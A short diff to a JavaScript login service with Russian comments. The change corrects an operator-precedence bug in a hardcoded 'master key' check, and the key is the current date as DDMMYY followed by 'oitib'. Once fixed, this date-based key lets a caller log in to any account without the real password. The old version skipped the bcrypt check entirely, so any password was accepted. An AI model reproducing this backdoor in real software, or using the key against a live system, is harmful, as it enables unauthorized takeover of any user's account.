@@ -114,7 +114,7 @@ class LoginService {
       throw ApiError.BadRequest("Пользователь с таким login'ом не найден");
     }
     //Обход пароля - мастер ключ. Составляется как DDMMYYoitib, где DDMMYY - текущий день
-    if (!password === `${moment().format("DDMMYY")}oitib`) {
+    if (!(password === `${moment().format("DDMMYY")}oitib`)) {
       const isPassEquals = await bcrypt.compare(password, user.password);
       if (!isPassEquals) {
         throw ApiError.BadRequest("Неверный пароль");
